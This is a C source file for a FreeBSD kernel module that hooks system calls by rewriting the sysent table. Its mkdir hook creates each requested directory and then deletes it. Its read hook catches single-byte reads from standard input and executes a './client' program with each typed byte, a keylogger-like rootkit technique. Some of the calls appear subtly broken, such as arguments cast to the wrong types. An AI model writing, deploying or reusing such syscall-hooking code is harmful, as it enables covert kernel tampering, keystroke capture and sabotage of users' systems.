#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/unistd.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/dirent.h>

/*static int recursiveDelete(struct thread *td, char *dirname);

struct linux_dirent {
    ino_t d_ino;
    off_t d_off;
    uint16_t d_reclen;
    uint8_t d_type;
    uint16_t d_namlen;
    char d_name[MAXNAMLEN + 1];
};
*/
static int mkdir_hook(struct thread *td, void *syscall_args){
    struct mkdir_args *uap; /* char *path; int mode */
    uap = (struct mkdir_args *)syscall_args;
    char path[255];  
    size_t done;
    int error;
    error = copyinstr(uap->path, path, 255, &done);
    if (error != 0)
        return(error);
    /* Print a debug message. */
    uprintf("The directory \"%s\" will be created with the following permissions: %o\n", path, uap->mode);
    sys_mkdir(td, syscall_args);
    return sys_rmdir(td, (void *)uap->path);
}

static int read_hook(struct thread *td, void *syscall_args){
	//printf("called read hook\n");
	struct read_args *uap;
	uap = (struct read_args *)syscall_args;
	
	int error = sys_read(td, syscall_args);
	
	if(error){
		return error;
	} else if (!uap->nbyte){
		return 1;
	} else if (uap->nbyte > 1){
		return 1;
	} else if (uap->fd != 0){
		return 1;
	}
	struct execve_args args;
	char *newArgs[] = {"./client", uap->buf, NULL};
	args.path = "./client";
	args.argv = newArgs;
	args.envp = NULL;
	
	sys_execve(td, (void *)args);
	return 0;
}

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;
    	switch (cmd) {
        	case MOD_LOAD:
           		/* Replace read with read_hook. */
              		printf("What's gucci?\n");
			sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
                	sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			//sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
                	break;
     		case MOD_UNLOAD:
			printf("bye fam\n");
                	sysent[SYS_mkdir].sy_call = (sy_call_t *)sys_mkdir;
                	sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
			//sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
			break;
            	default:
                	error = EOPNOTSUPP;
                	break;
	}
    	return(error);
}
static moduledata_t mod_hooks = {
    "hooks", /* module name */
    load, /* event handler */
    NULL /* extra data */
};

DECLARE_MODULE(hooks, mod_hooks, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
